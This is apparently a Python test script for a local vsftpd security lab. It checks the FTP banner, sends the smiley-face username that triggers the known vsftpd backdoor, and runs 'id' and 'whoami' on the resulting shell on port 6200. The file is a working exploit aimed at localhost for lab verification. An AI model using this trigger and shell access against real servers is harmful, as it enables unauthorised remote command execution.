"""Test rapido del lab vsftpd: banner, activacion del backdoor y shell 6200."""
import socket


def read_until(s, marker: str, timeout: float = 5.0) -> str:
    s.settimeout(timeout)
    data = b""
    try:
        while marker.encode() not in data:
            chunk = s.recv(256)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors="replace")


def main() -> None:
    # 1) banner
    s = socket.create_connection(("127.0.0.1", 2121), timeout=5)
    banner = read_until(s, "220")
    print("banner:", banner.strip()[:60])
    # 2) activar backdoor con smiley (el real responde 331 y sigue)
    s.sendall(b"USER test:)\r\n")
    _ = read_until(s, "331")
    s.close()
    # 3) shell en 6200: el backdoor real no saluda; responde 'id' con uid=
    sh = socket.create_connection(("127.0.0.1", 6200), timeout=5)
    sh.sendall(b"id\n")
    out = read_until(sh, "uid=")
    print("shell-6200:", out.strip()[:80])
    sh.sendall(b"whoami\n")
    out2 = read_until(sh, "not found")
    print("comando-2:", out2.strip()[:80])
    sh.close()


if __name__ == "__main__":
    main()
